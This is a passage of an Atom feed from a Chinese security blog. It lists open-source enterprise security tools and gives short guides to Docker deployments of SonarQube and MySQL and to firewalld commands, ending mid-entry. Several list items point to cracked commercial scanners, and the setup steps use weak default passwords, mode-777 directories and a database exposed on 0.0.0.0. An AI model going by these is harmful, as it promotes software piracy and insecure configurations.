<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Pa55w0rd &#39;s Blog</title>
  
  <subtitle>记录</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.pa55w0rd.club/"/>
  <updated>2018-12-26T10:03:15.924Z</updated>
  <id>http://www.pa55w0rd.club/</id>
  
  <author>
    <name>Pa55w0rd</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>企业安全建设中用到的开源or“免费”的工具</title>
    <link href="http://www.pa55w0rd.club/other/"/>
    <id>http://www.pa55w0rd.club/other/</id>
    <published>2022-02-22T14:22:22.000Z</published>
    <updated>2018-12-26T10:03:15.924Z</updated>
    
    <content type="html"><![CDATA[<p>跳到甲方工作也差不多两年了，参与部分企业安全建设工作，主要工作还是渗透和开源平台的建设和维护使用</p><p>在这种“甲方”的工作体会就是</p><ol><li><p>公司不是很重视安全这块，网络安全法出台，明确要求企业要做等保测评，招个人做吧</p></li><li><p>没有资源，要钱没有，要人没有，好在研发的小伙伴和运维小伙伴比较支持工作</p></li></ol><p>两年里，搭建了很多开源的系统，在这里分类了一下， 如果有更好的 <strong>欢迎推荐</strong></p><p>安装和使用可以去看官方文档</p><p>有基础的python和php知识，进行简单二次开发，还有就是调试软件，开源的很多莫名其妙的bug</p><p>研发能力强的团队，可以深入甲方企业安全，贴近业务，定制化去开发</p><a id="more"></a><h3 id="漏扫"><a href="#漏扫" class="headerlink" title="漏扫"></a>漏扫</h3><ul><li><a href="https://www.tenable.com/downloads/nessus" target="_blank" rel="noopener">nessus</a>（<a href="https://www.tenable.com/products/nessus/activation-code" target="_blank" rel="noopener">Home版</a>）</li><li>openvas(在<a href="https://www.kali.org/tutorials/configuring-and-tuning-openvas-in-kali-linux/" target="_blank" rel="noopener">kali中安装openvas</a>，注意挂代 理，不然会很慢很慢和报错)</li><li>awvs（破解版-52pojie）</li><li>APPscan (<a href="https://pan.baidu.com/s/1sjkDDi1#list/path=%2F" target="_blank" rel="noopener">破解版</a>)</li><li>Burpsuite pro （破解版）</li><li><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF" target="_blank" rel="noopener">mobsf</a> (移动app客户端，支持ios，但是需要在mac上跑)</li><li>Nmap/Zmap/masscan 端口扫描<h3 id="漏洞管理"><a href="#漏洞管理" class="headerlink" title="漏洞管理"></a>漏洞管理</h3></li><li><a href="https://github.com/creditease-sec/insight" target="_blank" rel="noopener">洞察insight</a></li><li>smef</li><li><a href="https://github.com/jeffzh3ng/Fuxi-Scanner/" target="_blank" rel="noopener">Fuxi</a></li><li><a href="https://github.com/DefectDojo/django-DefectDojo" target="_blank" rel="noopener">DefectDojo</a><h3 id="项管"><a href="#项管" class="headerlink" title="项管"></a>项管</h3></li><li>jira</li><li>禅道<h3 id="src平台"><a href="#src平台" class="headerlink" title="src平台"></a>src平台</h3></li><li><a href="https://github.com/martinzhou2015/SRCMS" target="_blank" rel="noopener">SRCMS</a></li><li><a href="https://github.com/233sec/laravel-src" target="_blank" rel="noopener">laravel-src</a><h3 id="资产管理-自动化运维"><a href="#资产管理-自动化运维" class="headerlink" title="资产管理/自动化运维"></a>资产管理/自动化运维</h3></li><li><a href="https://github.com/ysrc/xunfeng" target="_blank" rel="noopener">xunfeng</a></li><li>AssetsView</li><li><a href="https://github.com/Tencent/bk-cmdb" target="_blank" rel="noopener">蓝鲸bk-cmdb</a></li><li><a href="https://github.com/bongmu/OpsManage" target="_blank" rel="noopener">OpsManage</a></li><li><a href="http://www.ansible.com.cn/" target="_blank" rel="noopener">Ansible</a></li><li><a href="https://docs.saltstack.com/en/latest/contents.html" target="_blank" rel="noopener">Saltstack</a><h3 id="soc"><a href="#soc" class="headerlink" title="soc"></a>soc</h3></li><li>sosrp</li><li>w3a_SOC</li><li>OpenSOC</li><li>ossim<h3 id="入侵检测-安全监控-流量回溯"><a href="#入侵检测-安全监控-流量回溯" class="headerlink" title="入侵检测/安全监控/流量回溯"></a>入侵检测/安全监控/流量回溯</h3></li><li>suricata(selks)</li><li>bro</li><li>ossec(wazuh)</li><li>Security Onion</li><li>OwlH</li><li>Nethserver</li><li>Snort</li><li>OpenWIPS-NG</li><li>moloch</li><li><a href="https://github.com/DianrongSecurity/AgentSmith-HIDS" target="_blank" rel="noopener">点融AgentSmith-HIDS</a></li><li><a href="https://github.com/ysrc/yulong-hids" target="_blank" rel="noopener">同程-驭龙</a></li><li><a href="https://github.com/chaitin/cloudwalker" target="_blank" rel="noopener">CloudWalker（牧云）现在只开放webshell查杀</a></li><li>Osquery<h3 id="web应用安全"><a href="#web应用安全" class="headerlink" title="web应用安全"></a>web应用安全</h3></li><li><a href="https://github.com/loveshell/ngx_lua_waf" target="_blank" rel="noopener">ngx_lua_waf</a></li><li><a href="https://github.com/starjun/openstar" target="_blank" rel="noopener">openstar</a></li><li><a href="https://github.com/SpiderLabs/ModSecurity/tree/nginx_refactoring" target="_blank" rel="noopener">ModSecurity</a></li><li><a href="https://github.com/titansec/OpenWAF" target="_blank" rel="noopener">openwaf</a></li><li><a href="https://github.com/baidu/openrasp" target="_blank" rel="noopener">openRASP</a></li><li>x-waf</li><li>jxwaf<h3 id="终端安全集中管理"><a href="#终端安全集中管理" class="headerlink" title="终端安全集中管理"></a>终端安全集中管理</h3></li><li>360企业版</li><li>火绒企业安全<h3 id="堡垒机"><a href="#堡垒机" class="headerlink" title="堡垒机"></a>堡垒机</h3></li><li><a href="https://github.com/jumpserver/jumpserver" target="_blank" rel="noopener">jumpserver</a></li><li>teleport<h3 id="代码质量管理-代码审计"><a href="#代码质量管理-代码审计" class="headerlink" title="代码质量管理/代码审计"></a>代码质量管理/代码审计</h3></li><li>sonar + jekins</li><li>cobra</li><li>VCG</li><li>fortify(破解版，找到最新的规则是2018.3)</li><li>RIPS/Seay源代码审计系统(PHP))</li><li>Findbugs（JAVA）</li></ul><h3 id="web日志审计"><a href="#web日志审计" class="headerlink" title="web日志审计"></a>web日志审计</h3><ul><li>360星图</li><li><a href="https://github.com/apxar/xlog" target="_blank" rel="noopener">xlog</a></li><li><a href="https://github.com/jensvoid/lorg" target="_blank" rel="noopener">lorg</a><h3 id="日志分析系统"><a href="#日志分析系统" class="headerlink" title="日志分析系统"></a>日志分析系统</h3></li><li>elk（es+logstash+kibana)</li><li><a href="https://github.com/anbai-inc/Kibana_Hanization" target="_blank" rel="noopener">Kibana_Hanization(kibana汉化)</a><h3 id="上网行为管理-准入-认证"><a href="#上网行为管理-准入-认证" class="headerlink" title="上网行为管理/准入/认证"></a>上网行为管理/准入/认证</h3></li><li><a href="https://packetfence.org/" target="_blank" rel="noopener">packetfence</a></li><li>ikuai</li><li>openldap</li><li><a href="https://github.com/apereo/cas" target="_blank" rel="noopener">中央认证服务（CAS）</a><h3 id="数据防泄漏"><a href="#数据防泄漏" class="headerlink" title="数据防泄漏"></a>数据防泄漏</h3></li><li>opendlp<h3 id="基线检查-加固"><a href="#基线检查-加固" class="headerlink" title="基线检查/加固"></a>基线检查/加固</h3></li><li><a href="https://learn.cisecurity.org/benchmarks" target="_blank" rel="noopener">CIS</a></li><li><a href="https://github.com/CISOfy/lynis/" target="_blank" rel="noopener">Lynis审计</a></li><li><a href="https://github.com/A-mIn3/WINspect" target="_blank" rel="noopener">WINSpect</a></li><li><a href="https://www.open-scap.org/" target="_blank" rel="noopener">OpenSCAP</a><h3 id="github泄露扫描"><a href="#github泄露扫描" class="headerlink" title="github泄露扫描"></a>github泄露扫描</h3></li><li><a href="https://github.com/MiSecurity/x-patrol" target="_blank" rel="noopener">x-patrol</a></li><li><a href="https://github.com/0xbug/Hawkeye" target="_blank" rel="noopener">Hawkeye</a></li><li><a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">GSIL</a></li><li><a href="https://github.com/VKSRC/Github-Monitor" target="_blank" rel="noopener">VKSRC/Github-Monitor</a><h3 id="目录索引系统-个人网盘-文件共享"><a href="#目录索引系统-个人网盘-文件共享" class="headerlink" title="目录索引系统/个人网盘/文件共享"></a>目录索引系统/个人网盘/文件共享</h3></li><li><a href="https://github.com/helloxz/zdir" target="_blank" rel="noopener">zdir</a></li><li><a href="https://nextcloud.com/" target="_blank" rel="noopener">nextcloud</a></li><li><a href="https://www.seafile.com/product/private_server/" target="_blank" rel="noopener">Seafile社区版 </a></li><li>ownCloud</li><li>OnionShare</li><li>Pydio Cells<h3 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h3></li><li><a href="https://github.com/p1r06u3/opencanary_web" target="_blank" rel="noopener">opencanary_web</a></li><li><a href="https://github.com/dtag-dev-sec/tpotce" target="_blank" rel="noopener">T-Pot</a></li><li><a href="https://github.com/threatstream/mhn" target="_blank" rel="noopener">mhn</a><h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3></li><li><a href="https://github.com/p1r06u3/phishing" target="_blank" rel="noopener">P神的phishing</a></li><li><a href="https://github.com/sdlchina/mail_fishing" target="_blank" rel="noopener">mail_fishing</a></li><li><a href="https://github.com/thelinuxchoice/blackeye" target="_blank" rel="noopener">blackeye</a></li><li><a href="https://github.com/gophish/gophish" target="_blank" rel="noopener">Gophish</a><h3 id="API网关"><a href="#API网关" class="headerlink" title="API网关"></a>API网关</h3></li><li><a href="https://github.com/eolinker/GoKu-API-Gateway" target="_blank" rel="noopener">GoKu-API-Gateway</a></li><li><a href="https://konghq.com/faqs/" target="_blank" rel="noopener">Kong</a></li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li><a href="https://github.com/apxar/xlog" target="_blank" rel="noopener">WebRange(docker管理平台)</a></li><li><a href="https://github.com/pluosi/app-host" target="_blank" rel="noopener">app-host（内网app发布）</a></li><li><a href="https://github.com/baidu/AdvBox" target="_blank" rel="noopener">AdvBox</a></li><li><a href="https://github.com/facebook/osquery" target="_blank" rel="noopener">osquery</a></li><li><a href="https://github.com/liujiantaoliu/TT-SSO" target="_blank" rel="noopener">PHP-SSO</a></li><li><a href="https://github.com/HandsomeOne/Scout" target="_blank" rel="noopener">Scout(url监控平台)</a></li><li><a href="https://github.com/jx-sec/jxotp" target="_blank" rel="noopener">jxotp(SSH登陆双因素认证系统)</a></li><li><a href="https://github.com/sx1989827/DOClever" target="_blank" rel="noopener">DOClever</a></li><li><a href="https://github.com/CISOfy/lynis" target="_blank" rel="noopener">lynis审计</a></li><li><a href="https://github.com/jly8866/archer" target="_blank" rel="noopener">archer</a></li><li><a href="https://github.com/meolu/walle-web" target="_blank" rel="noopener">walle-web（代码部署平台）</a></li><li><a href="https://github.com/ctripcorp/apollo" target="_blank" rel="noopener">apollo(配置中心)</a></li><li><a href="https://github.com/chaitin/cloudwalker" target="_blank" rel="noopener">长亭开源牧云cloudwalker（只有webshell检测部分）</a></li><li><a href="https://github.com/threathunterX/nebula" target="_blank" rel="noopener">Nebula “星云”业务风控系统</a></li><li>美团DBProxy数据库防火墙</li><li>Linxu下 rkhunter/chkrootkit </li><li>Win下 pchunter/ 火绒剑/ PowerTool/ ProcessExplorer/ ProcessHacker/ autoruns/ OTL</li><li><a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe" target="_blank" rel="noopener">Kaspersky</a></li><li><a href="https://github.com/jensvoid/lorg" target="_blank" rel="noopener">Fastir_Collector_win取证</a></li><li><a href="https://github.com/SekoiaLab/Fastir_Collector_Linux" target="_blank" rel="noopener">Fastir_Collector_Linux取证</a></li><li>D盾 webshell查杀</li><li>Sandboxie 个人版沙箱</li><li>ClamAV</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;跳到甲方工作也差不多两年了，参与部分企业安全建设工作，主要工作还是渗透和开源平台的建设和维护使用&lt;/p&gt;
&lt;p&gt;在这种“甲方”的工作体会就是&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;公司不是很重视安全这块，网络安全法出台，明确要求企业要做等保测评，招个人做吧&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;没有资源，要钱没有，要人没有，好在研发的小伙伴和运维小伙伴比较支持工作&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;两年里，搭建了很多开源的系统，在这里分类了一下， 如果有更好的 &lt;strong&gt;欢迎推荐&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;安装和使用可以去看官方文档&lt;/p&gt;
&lt;p&gt;有基础的python和php知识，进行简单二次开发，还有就是调试软件，开源的很多莫名其妙的bug&lt;/p&gt;
&lt;p&gt;研发能力强的团队，可以深入甲方企业安全，贴近业务，定制化去开发&lt;/p&gt;
    
    </summary>
    
      <category term="安全建设" scheme="http://www.pa55w0rd.club/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="记录" scheme="http://www.pa55w0rd.club/tags/%E8%AE%B0%E5%BD%95/"/>
    
      <category term="安全建设" scheme="http://www.pa55w0rd.club/tags/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
      <category term="开源工具" scheme="http://www.pa55w0rd.club/tags/%E5%BC%80%E6%BA%90%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Docker部署sonar</title>
    <link href="http://www.pa55w0rd.club/sonar/"/>
    <id>http://www.pa55w0rd.club/sonar/</id>
    <published>2019-01-08T06:06:04.000Z</published>
    <updated>2019-01-08T07:37:01.071Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Sonar是一个用于代码质量管理的开源平台，用于管理源代码的质量，可以从七个维度检测代码质量。通过插件形式，可以支持包括java,C#,C/C++,PL/SQL,Cobol,JavaScrip,Groovy等等二十几种编程语言的代码质量管理与检测。<br><a id="more"></a></p><h2 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h2><ol><li><p>获取 postgresql 的镜像</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>docker pull postgres</span><br></pre></td></tr></table></figure></li><li><p>启动 postgresql</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --name postgresql -p <span class="number">5432</span>:<span class="number">5432</span> -e POSTGRES_USER=sonar -e POSTGRES_PASSWORD=sonar -e POSTGRE_DB=sonar -v /opt/sonarqube/data/postgresql/<span class="symbol">data:</span>/var/<span class="class"><span class="keyword">lib</span>/<span class="title">postgresql</span>/<span class="title">data</span> -<span class="title">d</span> <span class="title">postgres</span></span></span><br></pre></td></tr></table></figure></li></ol><p>其中 postgresql为容器名称  POSTGRES_USER POSTGRES_PASSWORD POSTGRE_DB指定postgresql的用户名密码和数据库名，/opt/sonarqube/data/postgresql/data为pg数据库文件挂载到宿主机路径</p><ol start="3"><li><p>获取 sonarqube 的镜像</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>docker pull sonarqube</span><br></pre></td></tr></table></figure></li><li><p>启动 sonarqube</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --name sonarqube --link postgresql -e SONARQUBE_JDBC_URL=jdbc:postgresql:<span class="regexp">//</span>postgresql:<span class="number">5432</span><span class="regexp">/sonar -p 9001:9000 -v /</span>opt<span class="regexp">/sonarqube/</span>data<span class="regexp">/sonarqube/</span>data:<span class="regexp">/opt/</span>sonarqube<span class="regexp">/data -v /</span>opt<span class="regexp">/sonarqube/</span>data<span class="regexp">/sonarqube/</span>extensions<span class="regexp">/plugins:/</span>opt<span class="regexp">/sonarqube/</span>extensions<span class="regexp">/plugins -d sonarqube</span></span><br></pre></td></tr></table></figure></li></ol><p>其中–link postgresql 是指和 postgresql 容器连接通讯， 用网关的方式也可以 </p><p>创建/opt/sonarqube/data/sonarqube/data作为sonarqube的数据文件，<code>权限设置为777</code><br>创建/opt/sonarqube/data/sonarqube/extensions/plugins作为sonarqube的插件目录</p><h2 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h2><p>sonar使用中需要和CI工具进行配合使用进行自动化代码分析<br>与jenkins联动…</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Sonar是一个用于代码质量管理的开源平台，用于管理源代码的质量，可以从七个维度检测代码质量。通过插件形式，可以支持包括java,C#,C/C++,PL/SQL,Cobol,JavaScrip,Groovy等等二十几种编程语言的代码质量管理与检测。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>修改正在运行的docker容器的端口映射</title>
    <link href="http://www.pa55w0rd.club/docker1/"/>
    <id>http://www.pa55w0rd.club/docker1/</id>
    <published>2018-12-29T02:31:32.000Z</published>
    <updated>2018-12-29T05:43:25.796Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在创建容器时，只有自己本地使用，端口映射127.0.0.1</p><p>后面有同事也需要用这个，想要修改正在运行的容器的端口映射<br><a id="more"></a></p><h2 id="0x01-修改端口映射"><a href="#0x01-修改端口映射" class="headerlink" title="0x01 修改端口映射"></a>0x01 修改端口映射</h2><h3 id="1-确定修改容器的CONTAINER-ID"><a href="#1-确定修改容器的CONTAINER-ID" class="headerlink" title="1. 确定修改容器的CONTAINER ID"></a>1. 确定修改容器的CONTAINER ID</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker ps -a</span></span><br><span class="line"><span class="attribute">CONTAINER</span> ID        IMAGE                                      COMMAND                  CREATED             STATUS              PORTS                      NAMES</span><br><span class="line">a3ee16c438a0        mysql:<span class="number">5</span>.<span class="number">7</span>.<span class="number">13</span>                               <span class="string">"docker-entrypoint..."</span>   <span class="number">3</span> days ago          Up <span class="number">40</span> hours         <span class="number">127.0.0.1:6606</span>-&gt;<span class="number">3306</span>/tcp   open_source_mysqldb</span><br></pre></td></tr></table></figure><h3 id="2-进入目录"><a href="#2-进入目录" class="headerlink" title="2. 进入目录"></a>2. 进入目录</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># docker <span class="keyword">inspect</span> a3ee16c | <span class="keyword">grep</span> Id</span><br><span class="line"><span class="string">"Id"</span>: <span class="string">"a3ee16c438a01e7d0bfc0acf923e5c2d9ab5d68043145c7d8db782455e74147d"</span>,</span><br><span class="line"></span><br><span class="line"># cd <span class="regexp">/var/</span>lib<span class="regexp">/docker/</span>containers<span class="regexp">/a3ee16c438a01e7d0bfc0acf923e5c2d9ab5d68043145c7d8db782455e74147d</span></span><br></pre></td></tr></table></figure><h3 id="3-停止docker引擎服务"><a href="#3-停止docker引擎服务" class="headerlink" title="3. 停止docker引擎服务"></a>3. 停止docker引擎服务</h3><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># systemctl stop docker</span></span><br></pre></td></tr></table></figure><h3 id="4-修改-hostconfig-json-和-config-v2-json"><a href="#4-修改-hostconfig-json-和-config-v2-json" class="headerlink" title="4. 修改 hostconfig.json 和 config.v2.json"></a>4. 修改 hostconfig.json 和 config.v2.json</h3><ol><li><p>修改hostconfig.json<br> 找到PortBindings，修改HostIp为 0.0.0.0</p> <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"PortBindings"</span>: &#123;</span><br><span class="line">    <span class="string">"3306/tcp"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"HostIp"</span>: <span class="string">"0.0.0.0"</span>,  // 修改<span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>为<span class="number">0.0</span><span class="meta">.0</span><span class="meta">.0</span></span><br><span class="line">            <span class="string">"HostPort"</span>: <span class="string">"6606"</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>修改config.v2.json<br> 找到 ExposedPorts 和 Ports 对应项，修改Ports的HostIp为0.0.0.0</p> <figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"Ports"</span>: &#123;</span><br><span class="line">    <span class="string">"3306/tcp"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"HostIp"</span>: <span class="string">"0.0.0.0"</span>,</span><br><span class="line">            <span class="string">"HostPort"</span>: <span class="string">"6606"</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li></ol><h3 id="5-保存之后，启动docker服务，启动相应容器"><a href="#5-保存之后，启动docker服务，启动相应容器" class="headerlink" title="5. 保存之后，启动docker服务，启动相应容器"></a>5. 保存之后，启动docker服务，启动相应容器</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="literal">start</span> docker</span><br><span class="line">docker <span class="literal">start</span> open_source_mysqldb</span><br></pre></td></tr></table></figure><p><strong>结果</strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># docker ps </span><br><span class="line">CONTAINER ID        IMAGE                                      COMMAND                  CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">a3ee16c438a0        mysql:<span class="number">5.7</span><span class="meta">.13</span>                               <span class="string">"docker-entrypoint..."</span>   <span class="number">3</span> days ago          <span class="meta">Up</span> <span class="number">13</span> seconds       <span class="number">0.0</span><span class="meta">.0</span><span class="meta">.0</span>:<span class="number">6606</span>-&gt;<span class="number">3306</span>/tcp   open_source_mysqldb</span><br></pre></td></tr></table></figure></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://stackoverflow.com/questions/19335444/how-do-i-assign-a-port-mapping-to-an-existing-docker-container" target="_blank" rel="noopener">https://stackoverflow.com/questions/19335444/how-do-i-assign-a-port-mapping-to-an-existing-docker-container</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;在创建容器时，只有自己本地使用，端口映射127.0.0.1&lt;/p&gt;
&lt;p&gt;后面有同事也需要用这个，想要修改正在运行的容器的端口映射&lt;br&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="docker" scheme="http://www.pa55w0rd.club/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>insight洞察-漏洞生命周期管理使用</title>
    <link href="http://www.pa55w0rd.club/insight/"/>
    <id>http://www.pa55w0rd.club/insight/</id>
    <published>2018-12-26T08:03:17.000Z</published>
    <updated>2018-12-26T10:10:02.641Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>洞察是宜信安全部用来对公司内部系统所出现的安全漏洞进行线上全生命周期管理的漏洞管理平台。</p><p><a href="https://github.com/creditease-sec/insight" target="_blank" rel="noopener">项目地址</a></p><p>主要由3部分组成：</p><ul><li>应用系统资产管理</li><li>漏洞生命周期管理</li><li>安全知识库管理<a id="more"></a></li></ul><p>应用系统资产管理：对公司应用系统资产进行管理，包括系统名称、域名、重要级别、部门、负责人等。</p><p>漏洞生命周期管理：对公司应用系统产生的安全漏洞进行线上提交、通告、知悉、复测、分类、风险计算、修复期限计算、邮件提醒、漏洞数据分析统计等。</p><p>安全知识库管理：对安全知识、管理制度进行集中存放、线上学习、安全培训、知识传承等。</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><img src="/insight/1.jpg" title="test"><blockquote><p>点击看原图</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;洞察是宜信安全部用来对公司内部系统所出现的安全漏洞进行线上全生命周期管理的漏洞管理平台。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/creditease-sec/insight&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;项目地址&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;主要由3部分组成：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;应用系统资产管理&lt;/li&gt;
&lt;li&gt;漏洞生命周期管理&lt;/li&gt;
&lt;li&gt;安全知识库管理
    
    </summary>
    
      <category term="安全建设" scheme="http://www.pa55w0rd.club/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="漏洞管理" scheme="http://www.pa55w0rd.club/tags/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Centos 7 使用firewalld防火墙</title>
    <link href="http://www.pa55w0rd.club/firewall/"/>
    <id>http://www.pa55w0rd.club/firewall/</id>
    <published>2018-12-13T10:57:19.000Z</published>
    <updated>2018-12-29T03:02:18.883Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>启动一个服务：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="literal">start</span> firewalld.service</span><br></pre></td></tr></table></figure></li><li><p>关闭一个服务：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">stop</span> firewalld.service</span><br></pre></td></tr></table></figure></li><li><p>重启一个服务：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">systemctl</span> <span class="selector-tag">restart</span> <span class="selector-tag">firewalld</span><span class="selector-class">.service</span></span><br></pre></td></tr></table></figure></li><li><p>显示一个服务的状态：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">systemctl</span> <span class="selector-tag">status</span> <span class="selector-tag">firewalld</span><span class="selector-class">.service</span></span><br></pre></td></tr></table></figure></li></ul><a id="more"></a><ul><li><p>在开机时启用一个服务：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="builtin-name">enable</span> firewalld.service</span><br></pre></td></tr></table></figure></li><li><p>在开机时禁用一个服务：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="builtin-name">disable</span> firewalld.service</span><br></pre></td></tr></table></figure></li><li><p>查看服务是否开机启动：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="keyword">is</span>-enabled firewalld.service</span><br></pre></td></tr></table></figure></li><li><p>查看已启动的服务列表：</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">systemctl </span><span class="built_in">list-unit-files|grep</span> <span class="string">enabled</span></span><br></pre></td></tr></table></figure></li><li><p>查看启动失败的服务列表：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="comment">--failed</span></span><br></pre></td></tr></table></figure></li><li><p>查看所有打开的端口：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=<span class="keyword">public</span> --<span class="built_in">list</span>-ports</span><br></pre></td></tr></table></figure></li><li><p>更新防火墙规则： </p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-<span class="keyword">cmd</span><span class="bash"> --reload</span></span><br></pre></td></tr></table></figure></li><li><p>查看区域信息:  </p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-<span class="keyword">cmd</span><span class="bash"> --get-active-zones</span></span><br></pre></td></tr></table></figure></li><li><p>添加</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">firewall</span><span class="literal">-</span><span 